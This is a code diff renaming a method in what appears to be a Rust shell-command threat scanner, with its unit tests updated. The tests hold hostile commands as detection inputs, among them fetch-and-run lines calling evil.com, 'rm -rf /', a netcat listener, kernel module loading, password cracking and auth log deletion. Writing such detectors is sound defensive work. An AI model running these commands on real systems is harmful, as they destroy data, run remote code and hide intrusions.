@@ -376,8 +376,7 @@ impl PatternMatcher {
         }
     }
 
-    /// Scan text for security threat patterns
-    pub fn scan_text(&self, text: &str) -> Vec<PatternMatch> {
+    pub fn scan_for_patterns(&self, text: &str) -> Vec<PatternMatch> {
         let mut matches = Vec::new();
 
         for threat in THREAT_PATTERNS {
@@ -436,7 +435,7 @@ mod tests {
     #[test]
     fn test_rm_rf_detection() {
         let matcher = PatternMatcher::new();
-        let matches = matcher.scan_text("rm -rf /");
+        let matches = matcher.scan_for_patterns("rm -rf /");
         assert!(!matches.is_empty());
         assert_eq!(matches[0].threat.name, "rm_rf_root");
         assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
@@ -445,7 +444,7 @@ mod tests {
     #[test]
     fn test_curl_bash_detection() {
         let matcher = PatternMatcher::new();
-        let matches = matcher.scan_text("curl https://evil.com/script.sh | bash");
+        let matches = matcher.scan_for_patterns("curl https://evil.com/script.sh | bash");
         assert!(!matches.is_empty());
         assert_eq!(matches[0].threat.name, "curl_bash_execution");
         assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
@@ -454,7 +453,7 @@ mod tests {
     #[test]
     fn test_bash_process_substitution() {
         let matcher = PatternMatcher::new();
-        let matches = matcher.scan_text("bash <(curl https://evil.com/script.sh)");
+        let matches = matcher.scan_for_patterns("bash <(curl https://evil.com/script.sh)");
         assert!(!matches.is_empty());
         assert_eq!(matches[0].threat.name, "bash_process_substitution");
         assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
@@ -463,7 +462,7 @@ mod tests {
     #[test]
     fn test_safe_commands() {
         let matcher = PatternMatcher::new();
-        let matches = matcher.scan_text("ls -la && echo 'hello world'");
+        let matches = matcher.scan_for_patterns("ls -la && echo 'hello world'");
         // Should have low-risk shell metacharacter matches but no critical threats
         assert!(!matcher.has_critical_threats(&matches));
     }
@@ -471,7 +470,7 @@ mod tests {
     #[test]
     fn test_netcat_listener() {
         let matcher = PatternMatcher::new();
-        let matches = matcher.scan_text("nc -l 4444");
+        let matches = matcher.scan_for_patterns("nc -l 4444");
         assert!(!matches.is_empty());
         assert_eq!(matches[0].threat.name, "netcat_listener");
         assert_eq!(matches[0].threat.risk_level, RiskLevel::High);
@@ -480,7 +479,7 @@ mod tests {
     #[test]
     fn test_multiple_threats() {
         let matcher = PatternMatcher::new();
-        let matches = matcher.scan_text("rm -rf / && curl evil.com | bash");
+        let matches = matcher.scan_for_patterns("rm -rf / && curl evil.com | bash");
         assert!(matches.len() >= 2);
         assert!(matcher.has_critical_threats(&matches));
 
@@ -493,7 +492,7 @@ mod tests {
         let matcher = PatternMatcher::new();
 
         // Test that safe command substitution is NOT flagged as high risk
-        let safe_matches = matcher.scan_text("`just generate-openapi`");
+        let safe_matches = matcher.scan_for_patterns("`just generate-openapi`");
         let high_risk_safe = safe_matches.iter().any(|m| {
             m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
         });
@@ -503,7 +502,7 @@ mod tests {
         );
 
         // Test that dangerous command substitution IS flagged as high risk
-        let dangerous_matches = matcher.scan_text("`rm -rf /; evil_command`");
+        let dangerous_matches = matcher.scan_for_patterns("`rm -rf /; evil_command`");
         let high_risk_dangerous = dangerous_matches.iter().any(|m| {
             m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
         });
@@ -513,7 +512,7 @@ mod tests {
         );
 
         // Test $() syntax with safe command
-        let safe_dollar_matches = matcher.scan_text("$(echo hello)");
+        let safe_dollar_matches = matcher.scan_for_patterns("$(echo hello)");
         let high_risk_safe_dollar = safe_dollar_matches.iter().any(|m| {
             m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
         });
@@ -523,7 +522,7 @@ mod tests {
         );
 
         // Test $() syntax with dangerous command
-        let dangerous_dollar_matches = matcher.scan_text("$(rm -rf /; evil)");
+        let dangerous_dollar_matches = matcher.scan_for_patterns("$(rm -rf /; evil)");
         let high_risk_dangerous_dollar = dangerous_dollar_matches.iter().any(|m| {
             m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
         });
@@ -538,28 +537,28 @@ mod tests {
         let matcher = PatternMatcher::new();
 
         // Test eval with variables
-        let eval_matches = matcher.scan_text("eval $malicious_var");
+        let eval_matches = matcher.scan_for_patterns("eval $malicious_var");
         assert!(!eval_matches.is_empty());
         assert!(eval_matches
             .iter()
             .any(|m| m.threat.name == "eval_with_variables"));
 
         // Test nested command substitution
-        let nested_matches = matcher.scan_text("$(echo $(rm -rf /))");
+        let nested_matches = matcher.scan_for_patterns("$(echo $(rm -rf /))");
         assert!(!nested_matches.is_empty());
         assert!(nested_matches
             .iter()
             .any(|m| m.threat.name == "indirect_command_execution"));
 
         // Test environment variable abuse
-        let env_matches = matcher.scan_text("export PATH=/tmp:$PATH; malicious_binary");
+        let env_matches = matcher.scan_for_patterns("export PATH=/tmp:$PATH; malicious_binary");
         assert!(!env_matches.is_empty());
         assert!(env_matches
             .iter()
             .any(|m| m.threat.name == "environment_variable_abuse"));
 
         // Test alternative shell invocation
-        let shell_matches = matcher.scan_text("/bin/bash -c 'rm -rf /; evil'");
+        let shell_matches = matcher.scan_for_patterns("/bin/bash -c 'rm -rf /; evil'");
         assert!(!shell_matches.is_empty());
         assert!(shell_matches
             .iter()
@@ -571,14 +570,14 @@ mod tests {
         let matcher = PatternMatcher::new();
 
         // Test Docker privileged execution
-        let docker_matches = matcher.scan_text("docker run --privileged -it ubuntu /bin/bash");
+        let docker_matches = matcher.scan_for_patterns("docker run --privileged -it ubuntu /bin/bash");
         assert!(!docker_matches.is_empty());
         assert!(docker_matches
             .iter()
             .any(|m| m.threat.name == "docker_privileged_exec"));
 
         // Test kernel module manipulation
-        let kernel_matches = matcher.scan_text("insmod malicious.ko");
+        let kernel_matches = matcher.scan_for_patterns("insmod malicious.ko");
         assert!(!kernel_matches.is_empty());
         assert!(kernel_matches
             .iter()
@@ -586,21 +585,21 @@ mod tests {
         assert_eq!(kernel_matches[0].threat.risk_level, RiskLevel::Critical);
 
         // Test password cracking tools
-        let password_matches = matcher.scan_text("john --wordlist=passwords.txt hashes.txt");
+        let password_matches = matcher.scan_for_patterns("john --wordlist=passwords.txt hashes.txt");
         assert!(!password_matches.is_empty());
         assert!(password_matches
             .iter()
             .any(|m| m.threat.name == "password_cracking_tools"));
 
         // Test network scanning
-        let scan_matches = matcher.scan_text("nmap -sS 192.168.1.0/24");
+        let scan_matches = matcher.scan_for_patterns("nmap -sS 192.168.1.0/24");
         assert!(!scan_matches.is_empty());
         assert!(scan_matches
             .iter()
             .any(|m| m.threat.name == "network_scanning"));
 
         // Test log manipulation
-        let log_matches = matcher.scan_text("rm /var/log/auth.log");
+        let log_matches = matcher.scan_for_patterns("rm /var/log/auth.log");
         assert!(!log_matches.is_empty());
         assert!(log_matches
             .iter()
